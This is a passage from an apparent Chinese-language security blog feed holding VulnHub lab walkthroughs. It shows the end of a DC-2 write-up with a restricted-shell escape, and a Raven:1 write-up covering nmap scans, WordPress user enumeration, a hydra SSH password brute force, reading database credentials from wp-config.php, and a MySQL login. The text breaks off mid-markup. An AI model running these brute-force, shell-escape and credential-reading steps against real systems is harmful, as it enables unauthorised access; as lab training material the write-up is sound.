class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginform&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginform&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dc-2/wp-login.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;user_login&quot;</span>&gt;</span>Username or Email Address<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;log&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user_login&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;login_error&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;20&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;user_pass&quot;</span>&gt;</span>Password<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pwd&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user_pass&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;login_error&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;20&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;forgetmenot&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;rememberme&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rememberme&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;rememberme&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;forever&quot;</span>  /&gt;</span> Remember Me<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wp-submit&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;wp-submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button button-primary button-large&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Log In&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;redirect_to&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;http://dc-2/wp-admin/&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;testcookie&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>查看目录信息：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ ls -alhR /home<br>/home:<br>total 16K<br>drwxr-xr-x  4 root  root  4.0K Mar 21  2019 .<br>drwxr-xr-x 21 root  root  4.0K Mar 10  2019 ..<br>drwxr-xr-x  2 jerry jerry 4.0K Mar 21  2019 jerry<br>drwxr-x---  3 tom   tom   4.0K Jun 26 19:30 tom<br><br>/home/jerry:<br>total 28K<br>drwxr-xr-x 2 jerry jerry 4.0K Mar 21  2019 .<br>drwxr-xr-x 4 root  root  4.0K Mar 21  2019 ..<br>-rw------- 1 jerry jerry  333 Jun 26 20:30 .bash_history<br>-rw-r--r-- 1 jerry jerry  220 Mar 21  2019 .bash_logout<br>-rw-r--r-- 1 jerry jerry 3.5K Mar 21  2019 .bashrc<br>-rw-r--r-- 1 jerry jerry  223 Mar 21  2019 flag4.txt<br>-rw-r--r-- 1 jerry jerry  675 Mar 21  2019 .profile<br><br>/home/tom:<br>total 40K<br>drwxr-x--- 3 tom  tom  4.0K Jun 26 19:30 .<br>drwxr-xr-x 4 root root 4.0K Mar 21  2019 ..<br>-rwxr-x--- 1 tom  tom  1022 Jun 27 12:31 .bash_history<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_login<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_logout<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_profile<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bashrc<br>-rwxr-x--- 1 tom  tom    95 Mar 21  2019 flag3.txt<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .profile<br>drwxr-x--- 3 tom  tom  4.0K Mar 21  2019 usr<br><br>/home/tom/usr:<br>total 12K<br>drwxr-x--- 3 tom tom 4.0K Mar 21  2019 .<br>drwxr-x--- 3 tom tom 4.0K Jun 26 19:30 ..<br>drwxr-x--- 2 tom tom 4.0K Mar 21  2019 bin<br><br>/home/tom/usr/bin:<br>total 8.0K<br>drwxr-x--- 2 tom tom 4.0K Mar 21  2019 .<br>drwxr-x--- 3 tom tom 4.0K Mar 21  2019 ..<br>lrwxrwxrwx 1 tom tom   13 Mar 21  2019 less -&gt; /usr/bin/less<br>lrwxrwxrwx 1 tom tom    7 Mar 21  2019 ls -&gt; /bin/ls<br>lrwxrwxrwx 1 tom tom   12 Mar 21  2019 scp -&gt; /usr/bin/scp<br>lrwxrwxrwx 1 tom tom   11 Mar 21  2019 vi -&gt; /usr/bin/vi<br>You have new mail in /var/mail/tom<br></code></pre></td></tr></table></figure><p><strong>绕 rbash：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs shell">tom@DC-2:~$ cat flag3.txt<br>-rbash: cat: command not found<br><br>tom@DC-2:~$ export -p<br>declare -x HOME=&quot;/home/tom&quot;<br>declare -x LANG=&quot;en_US.UTF-8&quot;<br>declare -x LOGNAME=&quot;tom&quot;<br>declare -x MAIL=&quot;/var/mail/tom&quot;<br>declare -x OLDPWD<br>declare -rx PATH=&quot;/home/tom/usr/bin&quot;<br>declare -x PWD=&quot;/home/tom&quot;<br>declare -rx SHELL=&quot;/bin/rbash&quot;<br>declare -x SHLVL=&quot;1&quot;<br>declare -x SSH_CLIENT=&quot;192.168.135.141 52502 7744&quot;<br>declare -x SSH_CONNECTION=&quot;192.168.135.141 52502 192.168.135.148 7744&quot;<br>declare -x SSH_TTY=&quot;/dev/pts/0&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;tom&quot;<br><br>tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a<br><span class="hljs-meta">$</span><span class="bash"> /bin/bash</span><br>tom@DC-2:~$ cat flag3.txt<br>bash: cat: command not found<br>tom@DC-2:~$ /bin/cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br><br>tom@DC-2:~$ export -p<br>declare -x HOME=&quot;/home/tom&quot;<br>declare -x LANG=&quot;en_US.UTF-8&quot;<br>declare -x LOGNAME=&quot;tom&quot;<br>declare -x MAIL=&quot;/var/mail/tom&quot;<br>declare -x OLDPWD<br>declare -x PATH=&quot;/home/tom/usr/bin&quot;<br>declare -x PWD=&quot;/home/tom&quot;<br>declare -x SHELL=&quot;/bin/rbash&quot;<br>declare -x SHLVL=&quot;2&quot;<br>declare -x SSH_CLIENT=&quot;192.168.135.141 52502 7744&quot;<br>declare -x SSH_CONNECTION=&quot;192.168.135.141 52502 192.168.135.148 7744&quot;<br>declare -x SSH_TTY=&quot;/dev/pts/0&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;tom&quot;<br><br>tom@DC-2:~$ export PATH=$PATH:/bin/<br>tom@DC-2:~$ export -p<br>declare -x HOME=&quot;/home/tom&quot;<br>declare -x LANG=&quot;en_US.UTF-8&quot;<br>declare -x LOGNAME=&quot;tom&quot;<br>declare -x MAIL=&quot;/var/mail/tom&quot;<br>declare -x OLDPWD<br>declare -x PATH=&quot;/home/tom/usr/bin:/bin/&quot;<br>declare -x PWD=&quot;/home/tom&quot;<br>declare -x SHELL=&quot;/bin/rbash&quot;<br>declare -x SHLVL=&quot;2&quot;<br>declare -x SSH_CLIENT=&quot;192.168.135.141 52502 7744&quot;<br>declare -x SSH_CONNECTION=&quot;192.168.135.141 52502 192.168.135.148 7744&quot;<br>declare -x SSH_TTY=&quot;/dev/pts/0&quot;<br>declare -x TERM=&quot;xterm-256color&quot;<br>declare -x USER=&quot;tom&quot;<br>declare -x VIM=&quot;/usr/share/vim&quot;<br>declare -x VIMRUNTIME=&quot;/usr/share/vim/vim74&quot;<br><br>tom@DC-2:~$ cat flag3.txt<br>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Raven：1</title>
    <link href="/2022/06/27/Penetration/Vulnhub/Part-1/0x0A%20Raven-1/"/>
    <url>/2022/06/27/Penetration/Vulnhub/Part-1/0x0A%20Raven-1/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0A-Raven-1-vulnhub"><a href="#0x0A-Raven-1-vulnhub" class="headerlink" title="0x0A Raven: 1~vulnhub"></a>0x0A Raven: 1~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/raven-1,256/">Raven: 1 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.149</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span>  <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-27 05:23 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.0030s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.0010s latency).<br>Nmap scan report for 192.168.135.149<br>Host is up (0.00048s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.89 seconds<br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.149</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>简单的端口扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.149</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-27 05:26 EDT<br>Nmap scan report for 192.168.135.149<br>Host is up (0.0016s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>37354/tcp open  unknown<br>MAC Address: 00:0C:29:DE:6D:0E (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 4.03 seconds<br></code></pre></td></tr></table></figure><p><strong>全面扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.149</span>      <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-27 05:26 EDT<br>Nmap scan report for 192.168.135.149<br>Host is up (0.00028s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)<br>|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)<br>|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)<br>|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)<br>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-server-header: Apache/2.4.10 (Debian)<br>|_http-title: Raven Security<br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          37354/tcp   status<br>|   100024  1          42390/udp6  status<br>|   100024  1          47848/udp   status<br>|_  100024  1          56818/tcp6  status<br>37354/tcp open  status  1 (RPC #100024)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 16.78 seconds<br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.10 ((Debian))</td></tr><tr><td>111/tcp</td><td>open</td><td>rpcbind</td><td>rpcbind 2-4</td></tr><tr><td>37354/tcp</td><td>open</td><td>status</td><td>1 (RPC #100024)</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>80端口</strong></p><p>进行目录爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.149:80</span><br>---- Scanning URL: http://192.168.135.149:80/ ----<br>+ http://192.168.135.149:80/index.html (CODE:200|SIZE:16819)<br>+ http://192.168.135.149:80/server-status (CODE:403|SIZE:303)<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/<br> <br>---- Entering directory: http://192.168.135.149:80/wordpress/ ----<br>+ http://192.168.135.149:80/wordpress/index.php (CODE:301|SIZE:0)<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/wp-admin/<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/wp-content/<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/wp-includes/<br>+ http://192.168.135.149:80/wordpress/xmlrpc.php (CODE:405|SIZE:42)<br></code></pre></td></tr></table></figure><p>访问查看，点击 <code>SERVICE</code> 跳转至 <code>http://192.168.135.149/service.html</code> ，在其源码中找到 flag1：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- End footer Area --&gt;</span><br><span class="hljs-comment">&lt;!-- flag1&#123;b9bbcb33e11b80be759c4e844862482d&#125; --&gt;</span><br></code></pre></td></tr></table></figure><p>点击 <code>BLOG</code> 跳转至 <code>http://192.168.135.149/wordpress/</code> ，发现是个 WordPress 站点。</p><blockquote><p>发现点击 blog 的时候系统迟迟跳转不出来服务页面，后面发现跳转到 raven.local，所以修改一下 hosts 文件，方便探索。</p></blockquote><p>点击 <code>Login</code> 跳转至 <code>http://192.168.135.149/wordpress/wp-login.php</code> ，发现是 WordPress 登录页。</p><p>枚举 WordPress 用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.149/wordpress --enumerate u</span><br>[+] URL: http://192.168.135.149/wordpress/ [192.168.135.149]<br>[i] User(s) Identified:<br><br>[+] michael<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] steven<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure><p>使用 cewl 对站点生成字典：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl http://192.168.135.149/wordpress -w passwd.txt</span><br>CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;michael\nsteven&quot;</span> &gt; user.txt</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat user.txt</span>                  <br>michael<br>steven<br></code></pre></td></tr></table></figure><p>使用 wpscan 进行爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.149/wordpress -U user.txt -P passwd.txt</span><br>[+] URL: http://192.168.135.149/wordpress/ [192.168.135.149]<br>[i] No Valid Passwords Found.<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 换个大字典, 扫了几万个没扫到, 直接结束了, 看来是爆不出来</span><br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.149/wordpress -U user.txt -P /usr/share/wordlists/rockyou.txt</span><br></code></pre></td></tr></table></figure><p><strong>22端口</strong></p><p>得到两个用户名，对 SSH 进行爆破尝试。</p><p><strong>111端口</strong></p><p>查看无果</p><p><strong>37354端口</strong></p><p>查看无果</p><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>使用 hydra 对 SSH 进行爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -L user.txt -P passwd.txt 192.168.135.149 ssh</span><br>1 of 1 target completed, 0 valid password found<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 换个大字典</span><br><span class="hljs-meta">$</span><span class="bash"> hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.135.149 ssh</span><br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task<br>[DATA] attacking ssh://192.168.135.149:22/<br>[22][ssh] host: 192.168.135.149   login: michael   password: michael<br>[STATUS] 14344553.00 tries/min, 14344553 tries in 00:01h, 14344247 to do in 00:01h, 16 active<br></code></pre></td></tr></table></figure><p>成功爆破出一组账号：<code>login: michael   password: michael</code> ，steven 账号密码也在字典中，但破解出来需要较长时间。</p><p>登录 SSH：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh michael@192.168.135.149</span>                                                                               <br>michael@192.168.135.149&#x27;s password: <br><br>michael@Raven:~$ ls<br>michael@Raven:~$ whoami<br>michael<br>michael@Raven:~$ id<br>uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<br></code></pre></td></tr></table></figure><p>使用 find 查找 flag，得到 flag2：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ find / -name &quot;*flag*.txt&quot; 2&gt;/dev/null<br>/var/www/flag2.txt<br>michael@Raven:~$ cat /var/www/flag2.txt<br>flag2&#123;fc3fd58dcdad9ab23faca6e9a36e581c&#125;<br></code></pre></td></tr></table></figure><p>WordPress 网站是带数据库的，数据库密码在网站的配置文件中；WordPress 作为一款开源的 CMS，配置文件的路径是固定的。 </p><p>查看数据库配置文件，得到数据库账号密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /var/www/html/wordpress/wp-config.php</span><br>/** The name of the database for WordPress */<br>define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);<br><br>/** MySQL database username */<br>define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);<br><br>/** MySQL database password */<br>define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;);<br><br>/** MySQL hostname */<br>define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);<br><br>/** Database Charset to use in creating database tables. */<br>define(&#x27;DB_CHARSET&#x27;, &#x27;utf8mb4&#x27;);<br><br>/** The Database Collate type. Don&#x27;t change this if in doubt. */<br>define(&#x27;DB_COLLATE&#x27;, &#x27;&#x27;);<br></code></pre></td></tr></table></figure><p>登录 mysql，选择 <code>wordpress</code> 数据库，在 <code>wp_posts</code> 表中找到 flag3、flag4，在 <code>wp_users</code> 表中找到两个用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 